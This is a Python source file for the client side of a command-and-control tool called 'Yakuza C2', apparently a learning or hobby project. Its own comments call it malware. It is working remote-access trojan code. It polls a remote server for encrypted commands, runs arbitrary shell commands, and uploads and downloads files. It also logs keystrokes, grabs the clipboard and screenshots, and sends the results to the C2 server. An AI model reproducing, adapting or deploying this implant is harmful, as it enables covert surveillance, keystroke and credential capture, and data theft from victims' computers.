#!/usr/bin/env python3

""" linux_client_gui.py -
Yakuza Command & Control (C2) GUI Linux client codes
Author: Davood Yahay(D. Yakuza)
Last Update: 10 oct 2024 - 16 mehr 1403
"""

# Import for both Linux & Windows Builds
from os import getenv, uname, chdir, path, getcwd
from requests import get, exceptions, post, put
from colorama import Fore
from time import time, sleep
from subprocess import run, PIPE, STDOUT, Popen
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from pyperclip import paste, PyperclipWindowsException
from pynput.keyboard import Listener, Controller, Key
from PIL import ImageGrab, Image
from multiprocessing import Process
from sys import exit
from encryption import cipher
# Settings Variables(Constants) Importing
from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, INCOMING)


# Print C2 Client Side Message for avoid complexing in test operation
print(Fore.LIGHTMAGENTA_EX + "\n[+]-------------C2 Client Side-------------[+]" + Fore.RESET)

def run_job(os_command, count):
    """ This function will run an OS Command in the background and save output to the file.
    It gets called by the start method of multiprocessing Process. """
    with open(f"Job_{count}.txt", "w") as fHandle:
        process = Popen(os_command, shell=True, stdout=fHandle, stderr=fHandle)
        post_to_server(f"[+]-Client => Job_{count} has been started with pid: {process.pid}. "
                       f"\nUse the 'tasklist' command from windows to See all tasks with pid's. "
                       f"\nUse the 'taskkill /PID' command from windows to Kill a task with a pid number. "
                       f"\nOutput from job will be saved on the client in Job_{count}.txt \n")


def post_to_server(message: str, response_path=RESPONSE):
    """function to post data to C2 Server, accept message and response path
	optional as arguments"""
    try:
        # Byte encoding message and then encrypt it before POSTING
        message = cipher.encrypt(message.encode())

        # Post encoded encrypted message to Server via response_path address
        post(f"http://{C2_SERVER}:{PORT}{response_path}",
             data={RESPONSE_KEY: message},
             headers=HEADERS, proxies=PROXY)

    except exceptions.RequestException:
        return

# This Guard prevents our multiprocessing Process Calls from running our main codes
if __name__ == "__main__":

    def get_filename(input_string):
        """this is a function that split string and returns third item and greater items after that.
        by default, all forwarded slashes in the third item Changed to backslashes
        this can be disabled, if replace set on False during call function. """
        outputString = " ".join(input_string.split()[2:]).replace("\\", "/")

        # If Actually mean filepath is entered correctly and then return it.
        if outputString:
            return outputString
        # If not(else), return None and notify us on the server
        else:
            post_to_server(f"You mus enter filename after {outputString}. \n")



    def on_press(key_press):
        """the function to record keys being pressed, and send them to the server,
        this is called by the start method of pynput.keyboard's Listener"""
        global keyLog
        keyLog.append(key_press)


    # the delay between re-connection attempts when inactive is set in settings.py
    delay = DELAY

    # Initialize that support background jobs like Clipboard stealing, Key logging and screenshots
    clipCount = 0
    listener = None
    keyLog = []

    # This variable used to unique screenshots names
    shoutCount = 0

    # jobs list stores all background jobs
    jobs = []
    # jobCount used to count background jobs
    jobCount = 0

    # For Linux, get a unique identifying Information
    client = (getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time()))

    # UTF-8 encode the client first to be able be encrypting it, but then we need string, so decode it at the end
    encryptedClient = cipher.encrypt(client.encode()).decode()

    # clientPrint used for print only username@machine from client variable
    clientPrint = "@".join(client.split("@")[0:2])


    # Better use infinity loop when add control active sessions feature in Server Side
    while True:
        '''Try an http get requests to the C2 Server and retrieve command;
        if failed, Keep Trying forever.'''
        try:
            response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
            # test print
            print(client.split("@")[0], "=>", response.status_code, sep=" ")
            # if we got 404 status codes, raise an exception to jump to except block
            if response.status_code == 404:
                raise exceptions.RequestException

        except exceptions.RequestException:
            # print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
            try:
                sleep(delay)
                continue  # jump to the last iteration of the loop(while True:)
            except KeyboardInterrupt:
                print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Client Side" + Fore.RESET)
                exit()
        except KeyboardInterrupt:
            print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Client Side" + Fore.RESET)
            exit()
        except Exception as e:
            print(Fore.LIGHTYELLOW_EX + "\n[!] Unknown Error when Sending Request to C2 Server" + Fore.RESET)
            print(f'Error Content: {e}')
            exit()

        # noinspection PyUnboundLocalVariable
        # If we get a 204-Status Code from the Server, simply ReIterate the Loop with no sleep
        if response.status_code == 204:
            # test print
            # print("[+] Server Command Command Executed and Result send to C2 Server.")
            continue

        # Retrieve the command from response and decode it
        command = cipher.decrypt(response.content).decode()

        # Check if the command is cd without any input path, change to home directory
        if len(command) == 2 and command == "cd":
            homeDirectory = path.expanduser("~")
            chdir(homeDirectory)
            post_to_server(homeDirectory, CWD_RESPONSE)

        # if the Command is cd follow below blocks, first check cd with an input path
        elif command.startswith("cd "):
            # Splicing the command to remove the cd and the extract directory path
            directory = command[3:]

            # Try to Change Directory and handle the error if it occurs
            try:
                chdir(directory)
            except FileNotFoundError:
                post_to_server(f"No such directory {directory}.\n")
            except NotADirectoryError:
                post_to_server(f"{directory} is not a directory")
            except PermissionError:
                post_to_server(f"You have don't Permission to Access{directory}.\n")
            except OSError:
                post_to_server("There was a OS Error on client.\n")
            # If not error, send the current directory to the server for using in Prompt
            else:
                post_to_server(getcwd(), CWD_RESPONSE)

        # Run command using subprocess.run module
        elif not command.startswith("client "):

            # if the command doesn't end with '&', then run it on foreground;
            # otherwise run the command in the Background
            if not command.endswith(" &"):
                # Run the command and get the output
                commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout

                # test print
                # print("[+] OS-System command Executed on client Foreground
                # and results send back to the C2 Server.")

                # Send the output to the server, must be decoding it first because subprocess.run() return bytes
                post_to_server(commandOutput.decode())

            else:
                # Right strip '&' from the command
                command = command.rstrip(" &")

                # Start a background job using a Multiprocessing process for the command that we entered
                jobs.append(Process(target=run_job, args=(command, jobCount+1)))
                jobs[jobCount].start()

                # give run_job function time to post status to our c2 server, before a new command get request happens
                sleep(1)
                # Increment the counter to track our next job
                jobCount += 1

        # The client download FILENAME command allows us to transfer a file to the client from our C2 Server,
        # Actually Client download from our C2 server, in below elif block Handle the download command
        elif command.startswith("client download"):
            # Split out the filepath to download, and replace \ with /
            filepath = get_filename(command)

            # If we got IndexError, start a new iteration of the wile loop
            if filepath is None:
                continue

            # Return the basename(filename) from filepath
            filename = path.basename(filepath)

            # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
            encryptedFilepath = cipher.encrypt(filepath.encode()).decode()

            # Use and HTTP GET request to stream the requested file from c2 server
            try:
                with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
                         headers=HEADERS, proxies=PROXY) as response:

                    # If the file was not found, open it up and write it out to disk, then notify us on the server
                    if response.status_code == 200:
                        # Open the file and write the contents of the response to it
                        with open(filename, "wb") as fileHandle:
                            # Decrypt the Response content and write the file out to the Disk, then Notify us on Server
                            fileHandle.write(cipher.decrypt(response.content))

                        # Notify us on the server that the file was downloaded
                        post_to_server(f"\n[+] Client: {filename} is now Written in {filepath} on {client}.\n")

            # Exception Handling Common Errors maybe occurs
            except FileNotFoundError:
                # noinspection PyUnboundLocalVariable
                post_to_server(f"{filepath} is not found on the {client}.\n")
            except PermissionError:
                post_to_server(f"You don't have permission to download {filepath} on the {client}.\n")
            except OSError:
                post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")


        # The client upload FILENAME command allows us to transfer a file to the c2 server from our connected client,
        # Actually Client can Upload a file to server
        elif command.startswith("client upload"):

            # Split out the filepath to download, and replace \ with /
            filepath = get_filename(command)

            # If we got IndexError, start a new iteration of the wile loop
            if filepath is None:
                continue

            # Return the basename(filename) from filepath
            filename = path.basename(filepath)

            # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
            encryptedFilename = cipher.encrypt(filename.encode()).decode()

            # Read the file and use it as data argument for an HTTP PUT Request to our C2 Server
            try:
                with open(filepath, "rb") as fileHandle:
                    encryptedFile = cipher.encrypt(fileHandle.read())
                    put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encryptedFilename}", data=encryptedFile, stream=True,
                        headers=HEADERS, proxies=PROXY)

                # Notify us on the server that the file was downloaded
                post_to_server(f"[+] Client: {filename} is now Uploaded to {INCOMING}/{filename} on the {client}.\n")

            # Exception Handling Common Errors maybe occurs
            except FileNotFoundError:
                post_to_server(f"{filepath} is not found on the {client}.\n")
            except PermissionError:
                post_to_server(f"You don't have permission to Upload {filepath} from the {client}.\n")
            except OSError:
                post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")

        elif command.startswith("client zip"):
            # Split out the filepath to download, and replace \ with /
            filepath = get_filename(command)

            # If we got IndexError, start a new iteration of the wile loop
            if filepath is None:
                continue

            # Return the basename(filename) from filepath
            filename = path.basename(filepath)

            # ZIP file using AES Encryption and LZMA compression method
            try:
                # Make sure we are not trying to zip-encrypt directory and that the files are existed
                if path.isdir(filepath):
                    post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
                elif not path.isfile(filepath):
                    raise OSError
                else:
                    with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
                        zipFile.setpassword(ZIP_PASSWORD)
                        zipFile.write(filepath, arcname=filename)
                        post_to_server(f"{filename}.zip is now Zipped and Encrypted in {filepath}.zip on the client. \n")

            except OSError:
                post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")


        # the 'client unzip FILE' command allows us to Unzip-Decrypt files on the client
        elif command.startswith("client unzip"):
            # Split out the filepath to download, and replace \ with /
            filepath = get_filename(command)

            # If we got IndexError, start a new iteration of the wile loop
            if filepath is None:
                continue

            # Return the basename(filename) from filepath
            filename = path.basename(filepath)

            # Unzip AES Encrypted file using pyzipper
            try:
                with AESZipFile(filepath) as zipFile:
                    zipFile.setpassword(ZIP_PASSWORD)
                    zipFile.extractall(path.dirname(filepath))
                    post_to_server(f"{filename} is now Unzipped and Decrypted in {filepath} on the client. \n")
            # Handle Errors maybe Occurs
            except FileNotFoundError:
                post_to_server(f"{filepath} is not found on the {client}.\n")
            except PermissionError:
                post_to_server(f"You don't have permission to Unzip-Decrypt {filepath} on the {client}.\n")
            except OSError:
                post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")



        # the client Kill Command shutdown our malware
        elif command == "client kill":
            exit()

        # the 'client delay SECOND' command will Change delay time between Inactive Re-Connection attempts
        elif command.startswith("client delay"):
            try:
                delay = float(command.split()[2])
                # if delay under zero raise ValueError
                if delay < 0:
                    raise ValueError
            except (IndexError, ValueError):
                post_to_server("You must Enter a Positive Number for Sleep Delay in Seconds.\n")
            else:
                post_to_server(f"{client} is now Configured for a {delay} Seconds delay when set inactive .\n")

        # TODO: Implement 'client get clipboard' command using ImageShow.grabclipboard() from pillow module
        # the 'client get clipboard' Command allows us to Grab the client's clipboard data and save it to disk
        elif command == "client get clipboard":
            # Use this variable to make clipboard filename is unique
            clipCount += 1

            # Grab the client's clipboard data and save it to disk
            with open(f"clipboard_{clipCount}.txt", "w") as fileHandle:
                try:
                    fileHandle.write(paste())
                except PyperclipWindowsException:
                    post_to_server("the Windows Machine is currently Locked so Can't get Clipboard now. try again later... \n")
                else:
                    post_to_server(f"[+]-Client => clipboard_{clipCount}.txt has been Written on the Client.\n"
                                   f"[+] => Use client upload clipboard_{clipCount}.txt to get it on the C2 Server. \n")

        # the 'client keylog on' Command Start a Key Logger on the C2 Client
        elif command == "client keylog on":
            # When listener is None, mean the keylogger is OFF
            if listener is None:
                # Start a Key Logger on the C2 Client
                listener = Listener(on_press=on_press)
                listener.start()
                post_to_server("[+]-Client => A Key Logger is now Running on the Client.\n")
            else:
                post_to_server("[!]-Client => A Key Logger is already Running on the Client.\n")


        # the 'client keylog off' Command shutting down the Key Logger on the client and write the pressed keys to disk
        elif command == "client keylog off":
            # When listener is Not None(True), mean the keylogger is ON
            if listener is not None:
                listener.stop()

                with open("Keys.log", "a") as fileHandle:

                    # Read in each key pressed and make it more readable for us
                    for aKeyPressed in keyLog:
                        fileHandle.write(str(aKeyPressed)
                                         .replace("Key.enter", "\n").replace("'","")
                                         .replace("Key.space", " ").replace('""', "'")
                                         .replace("Key.shift_r", "").replace("Key.shift_l", "")
                                         .replace("Key.backspace", "").replace("Key.shift",""))

                # Clear the keyLog list and Re-Initialize the listener to signify 'Not On'
                keyLog.clear()
                listener = None
                post_to_server(f"[+]-Client => Key Logging is now Disabled on the client. Results Writen in Keys.log in the "
                               f"{clientPrint}\n[+]-Client => Use client upload Keys.log to get it on the C2 Server. \n")

        # the 'client type TEXT' command allows us to Type some text on the Client's Keyboard
        elif command.startswith("client type"):
            keyboard = None

            # Split out the text and join it back together as a string, then type it
            text = " ".join(command.split()[2:])

            if not text:
                post_to_server("[-]-Client => You must enter some text to type on the client. \n")
            else:
                try:
                    keyboard = Controller()
                    keyboard.type(text)
                    post_to_server(f"\n[+]-Client => Your message: \n{text} => was typed on the client\n")
                except keyboard.InvalidCharacterException:
                    post_to_server("[-]-Client => A not-typeable Characters was Encountered. \n")

        # the 'client screenshot' command allows us to grab a copy from the client's screen
        elif command == "client screenshot":
            # Use to be screenshot names is to be unique
            shoutCount += 1

            # Take a screenshot and save it
            screenshot = ImageGrab.grab(all_screens=True)
            screenshot.save(f"screenshot_{shoutCount}.png")

            # Notify us on server to screenshot saved
            post_to_server(f"screenshot_{shoutCount}.png has been Saved on the Client. "
                           f"\nUse client upload screenshot_{shoutCount}.png to get it. \n")

        # the 'client display IMAGE' command will display an image on the client's machine screen
        elif command.startswith("client display"):

            # Split out the filepath to display it,
            # then replace \ with / and if got IndexError continue to start of while iterate
            filepath = get_filename(command)

            # if the filepath not submit, continue to start of while iterate
            if filepath is None:
                continue
            else:
                try:
                    image = Image.open(filepath)
                    image.show()
                    post_to_server(f"[+]-Client => {filepath} is now Displaying on the {clientPrint}. \n")
                except OSError as e:
                    if "cannot identify image" in str(e).lower():
                        post_to_server(f"[!]-Client => {filepath} is not an image. \n")
                    elif "no such file" in str(e).lower():
                        post_to_server(f"[!]-Client => {filepath} is not Found on the {clientPrint}. \n")
                    else:
                        post_to_server(f"[!]-Client => Unable to Display {filepath} on the {clientPrint}. \n")


        # the "client max volume" command allows us to turn Client's machine volume on Max Volume
        elif command == "client max volume" or command == "client max":
            keyboard = Controller()
            for i in range(50):
                keyboard.press(Key.media_volume_up)
                keyboard.release(Key.media_volume_up)


        # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
        else:
            post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")






    print(Fore.LIGHTCYAN_EX + f"[+] Goodbye & Goodluck Ninja 🥷\n{client}" + Fore.RESET)
